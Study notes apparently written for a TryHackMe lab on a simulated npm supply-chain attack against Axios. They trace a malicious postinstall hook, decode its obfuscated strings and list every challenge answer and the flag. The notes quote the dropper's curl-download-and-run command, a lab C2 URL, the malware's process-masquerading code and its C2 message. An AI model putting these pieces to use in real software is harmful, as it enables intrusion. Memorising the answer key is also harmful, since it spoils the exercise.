# Chain Reaction — TryHackMe Study README

**Study date:** 25 November 2026  


> **Lab safety:** These notes document an authorised TryHackMe investigation. Do not install suspicious packages, run unknown payloads or reproduce malware activity on a normal workstation or production network. The JavaScript and Python analysis described here is static analysis; suspicious payloads should not be executed just to inspect them.

---

# 1. What is this room about?

This room demonstrates how a software supply-chain attack can compromise a developer's computer through an apparently normal package installation.

The target is an Ubuntu laptop belonging to Richard Lee, a junior developer who has recently started using Axios in a blog redesign project.

The investigation asks whether the laptop was affected by a malicious Axios dependency, how that dependency executed, what second-stage payload it downloaded, how the payload hid itself, how it maintained access and what it sent to its Command and Control (C2) server.

## Learning objectives

By completing the room, I practised how to:

- Understand a JavaScript/npm supply-chain attack.
- Use npm debug logs to find suspicious package installation activity.
- Identify malicious dependencies and lifecycle scripts.
- Understand how obfuscated JavaScript can hide commands and URLs.
- Decode embedded strings without executing the malicious JavaScript.
- Identify a C2 URL and a payload download command.
- Locate a second-stage Python payload.
- Investigate a disguised Linux process.
- Identify persistence through a Linux shell configuration file.
- Inspect the payload statically and decode its final message.
- Connect findings into an evidence-based attack timeline.

---

# 2. Understanding the Axios supply-chain incident

## 2.1 What is Axios?

**Axios** is a JavaScript library used to make HTTP requests from applications. Developers commonly use it in JavaScript and Node.js projects.

A developer may install Axios as a dependency. This creates a supply-chain risk: if a trusted package or one of its dependencies is compromised, malicious code can reach developers and organisations that install it.

## 2.2 What is a software supply-chain attack?

A **software supply-chain attack** compromises software, a dependency, a build process or another component that downstream users trust.

Instead of attacking every victim individually, an attacker compromises something that many developers or organisations already use.

In this room, the attack abuses the npm package ecosystem:

1. A maintainer account is compromised.
2. Malicious package versions are published.
3. A malicious dependency is added to Axios.
4. Developers install or update Axios.
5. npm automatically runs the dependency's `postinstall` script.
6. The script downloads and starts a second-stage payload.
7. The payload communicates with attacker-controlled infrastructure.

The key lesson is that a package installation can execute code, not merely copy files into a project.

## 2.3 Important terminology

| Term | Simple explanation |
|---|---|
| npm | Package manager used in the JavaScript/Node.js ecosystem |
| Package | A bundle of code distributed through a package registry |
| Dependency | Another package required by an application |
| Supply-chain attack | Attack that compromises a trusted software component or delivery process |
| Lifecycle script | Script npm can run during package lifecycle events |
| `postinstall` | npm lifecycle hook that runs after a package installation |
| RAT | Remote Access Trojan; malware that gives an attacker remote access or control |
| C2 | Command and Control infrastructure used to communicate with compromised devices |
| Dropper | Initial component that installs or downloads another payload |
| Second-stage payload | Additional malware downloaded or launched by an earlier component |
| Obfuscation | Transforming code or strings to make analysis harder |
| Persistence | Mechanism that allows malware to run again after a restart, login or other event |

---

# 3. Incident overview — the room's real-world attack description

The room describes an incident on **31 March 2026** in which malicious versions of Axios, `1.14.1` and `0.30.4`, were published to the npm registry.

The malicious versions introduced a dependency named `plain-crypto-js@4.2.1`. Its installation process used a hidden `postinstall` hook to run `node setup.js`.

The room's incident timeline is:

| Stage | Attack activity |
|---|---|
| 1. Social engineering | Attackers compromised a lead Axios maintainer's npm account through social engineering |
| 2. Resource development | A fake package, `plain-crypto-js@4.2.0`, was staged before the attack |
| 3. Backdoor creation | A malicious `plain-crypto-js@4.2.1` was published with a hidden postinstall hook |
| 4. Dependency injection | Malicious Axios versions `1.14.1` and `0.30.4` included the dependency |
| 5. Supply-chain execution | A developer installed or updated Axios; npm ran `node setup.js` |
| 6. Payload deployment | The installer deployed a platform-specific RAT |
| 7. C2 communication | The RAT contacted attacker-controlled infrastructure |

The room states that the malicious payloads targeted Windows, macOS and Linux.

## 3.1 Social engineering and ClickFix

The room describes the attack beginning with social engineering against an Axios maintainer.

The attackers allegedly:

- Researched the maintainer and his professional interests.
- Posed as a trusted company.
- Invited him into a convincing corporate Slack workspace.
- Sent a fake Microsoft Teams meeting link.
- Used a **ClickFix** technique to display a fake system error.
- Instructed the victim to enter commands to supposedly fix the issue.

The victim's execution of those commands silently installed an information stealer, which harvested an npm access token.

**ClickFix** is a social-engineering technique in which a victim is presented with a fake problem or verification step and persuaded to paste or execute a command.

**SOC lesson:** A command executed by a user is not automatically safe just because the user believes it is part of a verification, troubleshooting or meeting process.

## 3.2 Why inject a dependency instead of modifying Axios directly?

The room gives two reasons:

1. A separate dependency makes the payload modular and easier to modify or remove after execution.
2. The main Axios source code may receive more attention and monitoring than one of its dependencies.

This is a crucial supply-chain lesson: checking only the package named in a project's manifest may not be sufficient. Dependencies and their lifecycle scripts also need to be reviewed.

## 3.3 RAT observations from the incident overview

The room describes differences between platform-specific payloads:

| Platform | Behaviour described in the room |
|---|---|
| Linux | Simple Python RAT; the room says it did not persist on the system |
| Windows | PowerShell RAT that persisted through a Run registry key |
| macOS | Non-stripped binary that was comparatively easy to reverse engineer |

The room also identifies an HTTP C2 URL in the incident overview:

```text
hxxp://sfrclak[.]com:8000/6202033
```

This is a defanged indicator, written to reduce the chance of accidentally opening the malicious address.

The room notes that the payloads contained bugs and grammatical mistakes. The broader lesson is that attackers may spend considerable effort on the initial compromise while leaving later payloads comparatively simple to analyse.

## 3.4 Incident impact described by the room

The room states that systems updating Axios during the malicious publication window could have received the RAT. Possible downstream consequences include:

- Stolen credentials being sold or reused.
- Compromised developer devices being used to access internal networks.
- Attackers returning months later using credentials or access obtained during the initial compromise.

---

# 4. Important distinction: real-incident indicators vs challenge indicators

The challenge is described as closely mirroring the Axios incident, but its simulated package names, commands and C2 values are not identical to the real-incident overview.

Do not mix these indicators together.

| Item | Incident overview in Task 2 | Ubuntu challenge investigation |
|---|---|---|
| Axios version | `1.14.1` and `0.30.4` | `1.14.1` found in npm logs |
| Malicious dependency | `plain-crypto-js@4.2.1` | `typing-coreutils@1.6.4` |
| Postinstall command | `node setup.js` | `node postinst.js` |
| Initial JavaScript file | `setup.js` | `postinst.js` |
| C2 URL | `hxxp://sfrclak[.]com:8000/6202033` | `http://sfrquack.thm:8000/1502068` |
| Initial payload | Platform-specific RAT | Python payload in the Ubuntu challenge |
| Persistence | The overview says the Linux RAT does not persist | The challenge sample modifies `.profile` |

The two sets of indicators belong to different parts of the room: the incident overview and the simulated investigation. The challenge-specific findings below are taken from the uploaded investigation notes.

---

# 5. Task 3 — Detection cheat sheet

Task 3 provides techniques that help investigate the challenge. The main areas are npm logs, JavaScript deobfuscation and network traffic.

## 5.1 Investigating npm logs

npm stores debug logs for commands such as `npm install` and `npm update`.

Common location:

```bash
~/.npm/_logs/
```

List the newest logs:

```bash
ls -lt ~/.npm/_logs/
```

Inspect a relevant log:

```bash
cat ~/.npm/_logs/<LOG_FILENAME>
```

The room's generic example shows entries such as:

```text
verbose title npm update
verbose argv "update"
silly fetch manifest axios@1.14.1
silly fetch manifest plain-crypto-js@4.2.1
info run plain-crypto-js@4.2.1 postinstall node_modules/plain-crypto-js node setup.js
```

These entries can reveal:

- Which npm command was run.
- Which Axios version was fetched.
- Which dependency was installed.
- Whether a lifecycle script ran.
- Which operating system and Node/npm versions were involved.

**Why this is useful:** A package might no longer be installed when the investigation begins. The npm debug log can preserve historical evidence of an installation or update.

**Memory cue:** npm logs = What did the developer install, and what scripts ran?

## 5.2 Deobfuscating JavaScript safely

Malicious JavaScript may hide strings such as C2 URLs, commands, file paths, payload names and operating-system checks.

A useful approach is to:

1. Locate the function that transforms or decodes strings.
2. Identify the array containing encoded strings.
3. Identify any key or lookup table used by the transformation.
4. Reproduce only the string transformation in a separate analysis script.
5. Print the decoded strings.
6. Avoid calling the malicious entry-point function.

The room suggests using `console.log` to print variables of interest when analysing a JavaScript sample, but it warns that dangerous functions such as `fetch` or `exec` must be removed or neutralised before running any analysis code.

**Safer approach for this challenge:** Use static inspection and a separate decoder that reads the source text without importing or executing the malicious JavaScript.

## 5.3 Wireshark and C2 traffic

The room states that the second-stage payload communicates over plain HTTP.

Wireshark can help inspect:

- Outbound connections.
- HTTP requests.
- POST requests.
- C2 endpoints.
- Data sent from a compromised workstation.

The room notes that source-code analysis was enough to understand the challenge's C2 behaviour, but packet analysis is useful when the source code is unavailable or the investigator has only network evidence.

**Memory cue:** Wireshark = What did the host send or receive over the network?

---

# 6. Task 4 — Chain Reaction Ubuntu investigation

## 6.1 Scenario

The TryHackMe SOC team receives a threat report about the Axios supply-chain attack.

The team is investigating developer workstations. One employee, Richard Lee, stands out because he recently began using Axios while working on a blog redesign.

The target is:

```text
Hostname: lpt-18092
Operating system: Ubuntu
User: Richard Lee
```

The goal is to determine whether the laptop was compromised and reconstruct the attack chain.

## 6.2 Investigation checklist

The investigation needs to establish:

1. Which Axios version was installed.
2. Which dependency was suspicious.
3. Which command ran after installation.
4. How the JavaScript was obfuscated.
5. What key was used to decode the strings.
6. Which C2 URL was used.
7. What data was sent to initiate the payload download.
8. Where the initial Python payload was downloaded.
9. How the malware process appeared on the system.
10. Which persistence mechanism was used.
11. What final message was sent to C2.

---

# 7. Investigating npm installation history

## 7.1 Initial check: Is Axios installed now?

The investigation notes show that this command was run:

```bash
npm list axios
```

Output:

```text
/home/ubuntu
`-- (empty)
```

At first, this appeared to show that Axios was not installed.

However, this command checks the current npm project directory. It does not prove that Axios was never installed or updated in the past.

This is an important forensic distinction:

- **Current state:** What is installed now?
- **Historical evidence:** What was installed or executed previously?

## 7.2 Find recent npm logs

The investigation notes use:

```bash
ls -lt ~/.npm/_logs/
```

Then inspect the relevant log:

```bash
cat ~/.npm/_logs/2026-04-06T00_29_54_717Z-debug-0.log
```

Important evidence from the challenge:

```text
verbose title npm update
verbose argv "update"
silly fetch manifest axios@1.14.1
silly placeDep ROOT axios@1.14.1 REPLACE
silly fetch manifest typing-coreutils
silly placeDep ROOT typing-coreutils@1.6.4
info run typing-coreutils@1.6.4 postinstall node_modules/typing-coreutils node postinst.js
```

### What does this show?

- An npm update command was run.
- Axios `1.14.1` was fetched and placed in the project.
- `typing-coreutils@1.6.4` was installed.
- Its `postinstall` hook ran `node postinst.js`.

This is the first major evidence linking the workstation to the malicious dependency.

## 7.3 Challenge answers: package installation

| Question | Answer |
|---|---|
| What Axios version was installed? | `1.14.1` |
| What was the suspicious dependency? | `typing-coreutils@1.6.4` |
| What command was executed after installation? | `node postinst.js` |

**What I learned:** npm lifecycle scripts can execute automatically during package installation. A developer may believe they are simply installing a dependency, while the dependency's installation hook executes code.

---

# 8. Inspecting the malicious dependency

The investigation notes identify the dependency directory:

```bash
cd ~/Desktop/thm-blog/node_modules/typing-coreutils
```

List its contents:

```bash
ls -la
```

Find all files:

```bash
find . -type f
```

Important files:

```text
postinst.js
package.json
```

The main suspicious file was:

```text
postinst.js
```

The notes show it was opened for inspection with:

```bash
nano postinst.js
```

The JavaScript was heavily obfuscated and contained encrypted strings.

## 8.1 Important variables and functions

| Name | Role described in the investigation |
|---|---|
| `_trans_1` | String transformation/decryption function |
| `_trans_2` | Reverses and Base64-decodes strings before applying the transformation |
| `stq` | Array containing encrypted strings |
| `ord` | Encryption key |
| `_entry` | Main function that builds platform-specific commands and executes the payload |

These names provide starting points for analysis. I do not need to understand every obfuscated expression at once. I can identify the string array, the decoder and the key, then reconstruct the decoded values.

---

# 9. Recovering the JavaScript encryption key

The investigation found:

```javascript
ord = "OrDeR_7077"
```

**Challenge answer:**

```text
OrDeR_7077
```

## 9.1 Understanding the string transformation

The investigation notes describe the following decoding sequence:

1. Reverse the encrypted string.
2. Replace underscores with equals signs.
3. Decode the Base64 string.
4. Apply an XOR transformation using the key.
5. Return the resulting plaintext.

The uploaded investigation used Python to reproduce the transformation without executing the malicious JavaScript.

## 9.2 Decoder used in the investigation notes

The following is the decoder recorded in the investigation. It is intended to extract and decode strings, not execute the malware.

```python
import re
import base64

key = "OrDeR_7077"

def decrypt(value):
    value = value[::-1].replace("_", "=")
    decoded = base64.b64decode(value).decode("utf-8")

    result = ""

    for i, char in enumerate(decoded):
        k = key[(7 * i * i) % 10]
        k = int(k) if k.isdigit() else 0

        result += chr(ord(char) ^ k ^ 333)

    return result

with open("postinst.js", "r") as f:
    source = f.read()

array = re.search(
    r"stq\s*=\s*\[(.*?)\],\s*ord",
    source
).group(1)

strings = re.findall(r'"([^"]*)"', array)

for i, value in enumerate(strings):
    try:
        print(f"\n--- stq[{i}] ---")
        print(decrypt(value))
    except Exception as e:
        print(f"Could not decrypt: {e}")
```

Run the decoder:

```bash
python3 decrypt.py
```

The key point is that the Python script reads the JavaScript source as text and decodes the strings. It does not call the malicious `_entry` function.

### Selected decoded strings from the investigation

| Array index | Decoded content |
|---|---|
| `stq[0]` | `child_process` |
| `stq[1]` | `os` |
| `stq[2]` | `fs` |
| `stq[3]` | `http://sfrquack.thm:8000/` |
| `stq[5]` | `win32` |
| `stq[6]` | `darwin` |
| `stq[12]` | Linux payload download command |

The decoded module names also provide clues about JavaScript capabilities:

- `child_process` can be used to start operating-system processes.
- `os` provides operating-system information.
- `fs` provides filesystem operations.

---

# 10. Finding the C2 URL

The decoded string at `stq[3]` contained the base URL:

```text
http://sfrquack.thm:8000/
```

The main function was called with:

```javascript
_entry("1502068")
```

The argument was appended to the base URL.

**Challenge answer — full C2 URL:**

```text
http://sfrquack.thm:8000/1502068
```

## 10.1 What is Command and Control?

C2 infrastructure is used by an attacker to communicate with compromised systems. A malware payload may contact its C2 server to receive instructions, download additional payloads, upload collected information, report execution status or confirm that a task has completed.

For a SOC analyst, the domain, IP address, port, URI and request pattern can all become investigation indicators.

---

# 11. Understanding the second-stage download command

The decoded `stq[12]` contained:

```bash
curl -o /tmp/.promise.py -d pypi.org/latest -s SCR_LINK && python3 /tmp/.promise.py SCR_LINK &
```

The investigation's challenge answer for the data sent to initiate the download was:

```text
pypi.org/latest
```

## 11.1 Command breakdown

| Component | Purpose |
|---|---|
| `curl` | Makes an HTTP request |
| `-o` | Specifies the output file |
| `/tmp/.promise.py` | Destination for the downloaded payload |
| `-d` | Sends data in the HTTP request body |
| `pypi.org/latest` | Data sent with the request |
| `-s` | Silent mode |
| `python3` | Runs the downloaded Python script |
| `&` | Runs the command in the background |

The command shows how the JavaScript dropper downloaded and launched a second-stage Python payload.

**Challenge answer — string sent to initiate payload download:**

```text
pypi.org/latest
```

## 11.2 Initial payload location

The same command identifies the output path:

```text
/tmp/.promise.py
```

**Challenge answer — initial Python payload absolute path:**

```text
/tmp/.promise.py
```

Linux uses `/tmp` for temporary files. Malware may use temporary directories to store downloaded components before running or moving them. Finding a file in `/tmp` is not enough to prove malware; establish its source, content, owner, timestamps and execution context.

---

# 12. Finding the running Python payload

The investigation next looked for the running payload process.

Initial command:

```bash
ps aux | grep -E 'python|promise'
```

The notes show several Python processes, including:

```text
/usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
python3 -m websockify 80 localhost:5901 -D
python3 server.py
python3 -m websockify 80 localhost:5901 -D
```

The command `python3 server.py` initially looked interesting, but it was not sufficient evidence to identify that process as the malware.

The investigation then used:

```bash
ps aux
```

and:

```bash
ps auxww | grep -E 'python|\.py|promise' | grep -v grep
```

The `ww` option helps display full command lines without normal width truncation.

## 12.1 Process masquerading

The investigation discovered that the payload changed its process argument list to disguise itself.

The challenge answer for the copied Python payload's command line was:

```text
unattended-upgr /home/ubuntu/.local/apt.conf
```

The malware used Python's `os.execve()` function. The investigation notes show this operation:

```python
os.execve(
    sys.executable,
    ["unattended-upgr", PathStr],
    os.environ.copy()
)
```

This caused the process to appear under the misleading name:

```text
unattended-upgr
```

The payload path was:

```text
/home/ubuntu/.local/apt.conf
```

### Why is this important?

The process name resembles a legitimate unattended-upgrade component. An analyst searching only for processes named `python` could miss it.

**SOC lesson:** Never decide that a process is safe based only on its displayed name. Investigate its full command line, executable or script path, parent process, owner, working directory, open files, network connections and related file/persistence activity.

---

# 13. Finding the persistence mechanism

The investigation found that the malware modified the user's shell initialization file:

```text
/home/ubuntu/.profile
```

The `.profile` file is used during login-shell initialisation. Modifying it can cause a command to execute again when the user starts a future login session.

**Challenge answer — MITRE ATT&CK sub-technique:**

```text
T1546.004
```

**Technique name:** Event Triggered Execution – Unix Shell Configuration Modification.

## 13.1 Why is this persistence?

Persistence is used to maintain access even after events such as a user logging out, a system restarting or a process being terminated.

By modifying a shell configuration file, malware can arrange for its payload to be launched during a later login.

## 13.2 What should an investigator check?

For a suspected Linux shell configuration modification, examine:

- The affected user's `.profile`.
- Related shell initialization files.
- The exact commands added.
- File owner and permissions.
- Timestamps.
- Referenced payload paths.
- Whether the referenced payload exists.
- Relevant login and process evidence.

Do not remove the suspicious line before recording and preserving it as evidence.

---

# 14. Locating and inspecting the copied Python payload

The investigation first checked the original download location:

```bash
ls -la /tmp/.promise.py
```

The result was:

```text
ls: cannot access '/tmp/.promise.py': No such file or directory
```

This indicated that the original file was no longer present at that location.

The process command line had revealed a second path:

```text
/home/ubuntu/.local/apt.conf
```

The investigation attempted to run the file and received `Permission denied`. A further attempt using `sudo` also failed. The important lesson recorded in the investigation was not to execute a suspicious payload simply to inspect it.

Instead, static analysis was performed.

## 14.1 Inspect file metadata

```bash
sudo ls -l /home/ubuntu/.local/apt.conf
```

Output:

```text
-rw-r--r-- 1 ubuntu ubuntu 11738 Apr 6 2026 /home/ubuntu/.local/apt.conf
```

This indicates:

- Owner: `ubuntu`.
- Group: `ubuntu`.
- Size: `11738` bytes.
- Permissions: owner can read/write; group and others can read.
- File path: `/home/ubuntu/.local/apt.conf`.

## 14.2 Inspect the beginning of the file

```bash
sudo head -n 40 /home/ubuntu/.local/apt.conf
```

The notes show Python source code and imports including:

```python
import string
import secrets
import os
import shutil
import platform
import time
import sys
import subprocess
import base64
import shlex
```

This established that the disguised `.apt.conf` file contained Python code.

### Why is this suspicious?

The filename looks like a configuration file, but its contents are Python code. The process name also imitates a legitimate system component.

This is an example of **masquerading**: using misleading names to make malicious files or processes look legitimate.

---

# 15. Finding and decoding the final C2 message

The investigation searched the copied payload for terms related to the final message and its encoding:

```bash
sudo grep -nEi 'LastInfo|base64|encode|decode|requests|post|flag' /home/ubuntu/.local/apt.conf
```

Important output:

```text
import base64
payload = base64.b64decode(scpt).decode("utf-8", errors="strict")
def send_post_request(full_url, data):
data = data.encode("utf-8")
conn.request("POST", path, data, headers)
encoded = base64.b64encode(json.dumps(body, ensure_ascii=False).encode()).decode()
body = {"type": "LastInfo", "uid": uid, "content": "9FycwVGZfJXdvl3X0lGZ1F2eNhEV"}
```

The most important evidence was the `LastInfo` message:

```python
body = {
    "type": "LastInfo",
    "uid": uid,
    "content": "9FycwVGZfJXdvl3X0lGZ1F2eNhEV"
}
```

This shows that the malware prepared a final C2 message with:

- Type: `LastInfo`.
- UID: a value stored in the `uid` variable.
- Content: an encoded string.

## 15.1 Decode the content

The investigation used:

```bash
echo "9FycwVGZfJXdvl3X0lGZ1F2eNhEV" | rev | base64 -d
```

Output:

```text
THM{audit_your_deps!}
```

**Challenge answer — decoded flag:**

```text
THM{audit_your_deps!}
```

## 15.2 Understand the command

**1. Reverse the string:**

```bash
rev
```

This reverses the order of characters.

**2. Decode Base64:**

```bash
base64 -d
```

This converts the Base64-encoded data into readable text.

Full pattern:

```bash
echo "ENCODED_VALUE" | rev | base64 -d
```

---

# 16. Complete challenge answers

| No. | Question | Answer |
|---:|---|---|
| 1 | What version of Axios was installed? | `1.14.1` |
| 2 | What was the suspicious dependency? | `typing-coreutils@1.6.4` |
| 3 | What command executed after installation? | `node postinst.js` |
| 4 | What was the JavaScript encryption key? | `OrDeR_7077` |
| 5 | What was the full C2 URL? | `http://sfrquack.thm:8000/1502068` |
| 6 | What string was sent to initiate the payload download? | `pypi.org/latest` |
| 7 | What was the initial Python payload path? | `/tmp/.promise.py` |
| 8 | What was the copied payload's process command line? | `unattended-upgr /home/ubuntu/.local/apt.conf` |
| 9 | What MITRE ATT&CK sub-technique was used for persistence? | `T1546.004` |
| 10 | What decoded flag was sent to C2? | `THM{audit_your_deps!}` |

---

# 17. Complete command reference

These are the main commands recorded in the challenge investigation.

## npm and log investigation

```bash
npm list axios
ls -lt ~/.npm/_logs/
cat ~/.npm/_logs/2026-04-06T00_29_54_717Z-debug-0.log
```

## Package inspection

```bash
cd ~/Desktop/thm-blog/node_modules/typing-coreutils
ls -la
find . -type f
nano postinst.js
```

## Search JavaScript source

```bash
grep -oE '.{0,100}LastInfo.{0,200}' postinst.js
grep -n -i -E 'LastInfo|lastinfo|flag|loop|fetch|post' postinst.js
```

## Static decryption

```bash
python3 decrypt.py
python3 decrypt.py > decoded.txt
grep -inE 'LastInfo|flag|loop|http|post|complete|finish' decoded.txt
```

## Process investigation

```bash
ps aux | grep -E 'python|promise'
ps aux
ps auxww | grep -E 'python|\.py|promise' | grep -v grep
```

## Temporary file investigation

```bash
ls -la /tmp/
find /tmp /var/tmp /dev/shm -type f -name ".*" 2>/dev/null
```

## Copied payload inspection

```bash
sudo ls -l /home/ubuntu/.local/apt.conf
sudo head -n 40 /home/ubuntu/.local/apt.conf
sudo grep -nEi 'LastInfo|base64|encode|decode|requests|post|flag' /home/ubuntu/.local/apt.conf
```

## Final flag decoding

```bash
echo "9FycwVGZfJXdvl3X0lGZ1F2eNhEV" | rev | base64 -d
```

> **Safety note:** These are investigation and inspection commands from the authorised lab. Do not execute the malicious `postinst.js` or copied Python payload. The decoder is for extracting strings, not launching the malware.

---

# 18. MITRE ATT&CK and SOC concepts

| Activity | Concept |
|---|---|
| Compromised third-party software dependency | Software supply-chain compromise |
| npm `postinstall` lifecycle script | Automatic execution during installation |
| Node.js child-process execution | Starting operating-system commands from JavaScript |
| Reversed Base64 strings and XOR | Obfuscation |
| `curl` payload retrieval | Payload download |
| Python second-stage payload | Multi-stage malware |
| Disguised process name `unattended-upgr` | Masquerading |
| Unix shell configuration modification | **T1546.004** |
| HTTP POST to C2 | Command and Control / data transfer |
| Reversed Base64 final content | Data encoding/obfuscation |

The specific MITRE ATT&CK sub-technique recorded in the challenge is **T1546.004 — Unix Shell Configuration Modification**.

---

# 19. What I learned as a SOC analyst

This investigation helped me understand how a supply-chain attack can progress from a seemingly normal package installation to malware execution and C2 communication.

## 19.1 Historical logs matter

Even when a package is no longer installed, npm debug logs can reveal which versions and dependencies were previously installed.

## 19.2 Automatic scripts deserve attention

The `postinstall` lifecycle hook can execute code automatically. A developer may think they are only installing a library, while a dependency is executing an additional script.

## 19.3 Static analysis can reveal obfuscated behaviour

I learned to identify the string array, decoding functions and encryption key in obfuscated JavaScript. I reproduced the decoding process in Python without running the malicious JavaScript.

## 19.4 Malware can use multiple stages

The JavaScript package acted as the initial dropper. It downloaded a second-stage Python payload, which performed additional malicious activity.

## 19.5 Process names can be misleading

The Python payload disguised its process arguments to look like `unattended-upgr`. Searching only for `python` would not reliably identify it.

## 19.6 Linux persistence can hide in user configuration

The challenge used `.profile` to arrange execution during future login sessions. Shell configuration files should therefore be included in Linux persistence investigations.

## 19.7 C2 investigation connects endpoint and network evidence

The source code revealed the C2 URL and request logic. Network tools such as Wireshark can help confirm whether the host actually communicated with the destination.

## 19.8 Correlation is more important than one indicator

A suspicious process name or file alone is not enough to confirm malware. Stronger conclusions come from correlating:

- npm installation history.
- Dependency and lifecycle-script evidence.
- Decoded JavaScript commands.
- Downloaded payload paths.
- Process command lines.
- Persistence files.
- C2 destinations and HTTP requests.

---

# 20. Final investigation summary

I investigated a suspected Axios npm supply-chain compromise on Richard Lee's Ubuntu developer workstation, `lpt-18092`.

Using npm debug logs, I identified Axios version `1.14.1` and the suspicious dependency `typing-coreutils@1.6.4`. I traced its `postinstall` execution to `postinst.js`, examined the obfuscated JavaScript and recovered the key `OrDeR_7077`.

I decoded the embedded strings and identified the challenge's C2 URL:

```text
http://sfrquack.thm:8000/1502068
```

The initial Python payload was downloaded to:

```text
/tmp/.promise.py
```

The malware later copied itself to:

```text
/home/ubuntu/.local/apt.conf
```

It disguised its process command line as:

```text
unattended-upgr /home/ubuntu/.local/apt.conf
```

I identified its persistence technique as MITRE ATT&CK `T1546.004`, involving Unix shell configuration modification through `.profile`.

Finally, I inspected the copied Python payload, found the `LastInfo` message and decoded its content.

The final flag was:

```text
THM{audit_your_deps!}
```

**My biggest takeaway:** Malware investigation is not about finding one suspicious file or process. It is about connecting evidence across package logs, dependencies, scripts, files, processes, persistence mechanisms and network communication to reconstruct the complete attack chain.

---

# 21. Self-assessment questions

Try answering these without looking back at the notes.

1. What is a software supply-chain attack?
2. Why can npm dependencies introduce security risks?
3. What is an npm `postinstall` hook?
4. Why are npm debug logs useful during an incident?
5. What did `npm list axios` show, and why was that not enough to rule out historical installation?
6. What was the suspicious dependency in the Ubuntu challenge?
7. What was the command executed by its postinstall hook?
8. What is JavaScript obfuscation?
9. What did the `stq` array contain?
10. What was the `ord` variable used for?
11. What was the decoded C2 URL in the challenge?
12. What was the purpose of the `curl` command?
13. Where was the initial Python payload downloaded?
14. Why did searching only for `python` risk missing the process?
15. What does `os.execve()` do in the context described by the investigation?
16. What was the copied payload's disguised process command line?
17. What is the purpose of `.profile`?
18. What does MITRE ATT&CK T1546.004 describe?
19. What information was included in the `LastInfo` message?
20. How did the final encoded value become readable?
21. What evidence would you correlate to confirm C2 communication?
22. Why should suspicious payloads be inspected statically rather than executed casually?

---

# 22. Quick revision sheet

| Term / artefact | Remember it as |
|---|---|
| Supply-chain attack | Compromise a trusted software component |
| npm | JavaScript package manager |
| Dependency | Package required by another package |
| `postinstall` | Script that can run after installation |
| npm debug log | History of npm commands and installation activity |
| Dropper | Initial component that retrieves or launches another payload |
| Obfuscation | Make code harder to read |
| XOR | Bitwise operation used in the challenge's string transformation |
| Base64 | Text encoding, not encryption |
| C2 | Attacker communication infrastructure |
| `curl` | Command-line tool used for HTTP requests |
| `/tmp/.promise.py` | Initial payload path in the challenge |
| `apt.conf` | Disguised filename used by the copied Python payload |
| `unattended-upgr` | Disguised process name |
| `.profile` | User login-shell configuration file |
| T1546.004 | Unix Shell Configuration Modification |
| `LastInfo` | Final message type identified in the Python payload |
| `rev` | Reverses the string |
| `base64 -d` | Decodes Base64 data |

### Investigation workflow to remember

**LOGS → DEPENDENCY → SCRIPT → DECODE → C2 → PAYLOAD → PROCESS → PERSISTENCE → REPORT**

1. **Logs:** Find the npm install/update history.
2. **Dependency:** Identify the package that ran the lifecycle script.
3. **Script:** Inspect the postinstall file.
4. **Decode:** Recover hidden strings without executing the malware.
5. **C2:** Identify the command-and-control destination.
6. **Payload:** Find where the second-stage file was downloaded.
7. **Process:** Identify the running process and its true command/path.
8. **Persistence:** Find how the malware runs again.
9. **Report:** Connect all evidence into a timeline and incident summary.

---

